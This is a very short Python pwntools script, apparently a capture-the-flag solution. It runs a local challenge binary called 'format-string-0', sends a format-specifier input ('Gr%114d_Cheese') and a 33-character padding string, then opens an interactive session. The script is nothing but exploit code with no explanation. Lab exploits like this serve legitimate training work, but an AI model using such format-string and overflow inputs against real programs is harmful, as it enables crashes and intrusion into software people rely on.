from pwn import *

p=process('./format-string-0')

print( p.recv().decode("utf-8")+"\n")
p.write("Gr%114d_Cheese\n")

p.write("A"*33+"\n")

print( p.recv().decode("utf-8")+"\n")

p.interactive()
